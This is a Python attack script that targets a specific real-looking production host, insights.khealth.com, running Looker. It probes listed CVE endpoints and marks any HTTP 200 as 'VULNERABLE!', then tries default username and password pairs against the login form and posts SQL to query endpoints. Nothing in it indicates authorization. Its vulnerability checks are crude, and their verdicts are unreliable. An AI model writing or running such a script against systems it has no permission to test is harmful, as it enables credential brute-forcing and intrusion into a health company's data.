#!/usr/bin/env python3
import requests
import json

print("[*] Testing Looker 26.18.1 Known Vulnerabilities\n")

base = "https://insights.khealth.com"
version = "26.18.1"

print(f"[*] Target: {base}")
print(f"[*] Version: {version}\n")

# Known Looker CVEs to test
cves = {
    "CVE-2024-4330": "/api/3.0/integration_hub",  # Integration hub RCE
    "CVE-2023-6637": "/api/3.0/spaces",  # Space traversal
    "CVE-2022-41145": "/api/3.0/projects",  # Project disclosure
    "CVE-2023-41072": "/api/3.0/dashboard_filters",  # Auth bypass
}

print("[*] Testing known CVEs...\n")
for cve, path in cves.items():
    try:
        r = requests.get(f"{base}{path}", timeout=5)
        print(f"{cve}: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ VULNERABLE!")
    except:
        pass

# Test login page for vulnerabilities
print("\n[*] Testing Login Page...\n")
try:
    r = requests.get(f"{base}/login", timeout=5)
    print(f"[✓] Login page accessible (200)")
    
    # Check for form fields, CSRF tokens, etc
    if 'username' in r.text or 'email' in r.text:
        print("[!] Login form detected")
    if '_token' in r.text or 'csrf' in r.text.lower():
        print("[!] CSRF token found")
        
    # Try common credential attacks
    print("\n[*] Testing common credentials...\n")
    creds = [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("admin", "password"),
        ("looker", "looker"),
    ]
    
    for username, password in creds:
        try:
            payload = {
                "username": username,
                "password": password,
            }
            r = requests.post(f"{base}/login", data=payload, timeout=5)
            print(f"  {username}:{password} -> {r.status_code}")
            if r.status_code == 200 or 'dashboard' in r.text.lower():
                print(f"    [!] Possible success")
        except:
            pass
            
except Exception as e:
    print(f"Error: {e}")

# Test for SQL injection in Looker query endpoints
print("\n[*] Testing for SQL Injection vectors...\n")

sql_paths = [
    "/api/3.0/queries/run/sql",
    "/api/3.0/queries/run",
    "/api/3.0/query/run",
    "/api/internal/query",
]

for path in sql_paths:
    try:
        r = requests.post(
            f"{base}{path}",
            json={"sql": "SELECT 1"},
            timeout=5
        )
        print(f"[{r.status_code}] {path}")
        if r.status_code == 200:
            print(f"  ✅ Query endpoint accessible!")
    except:
        pass

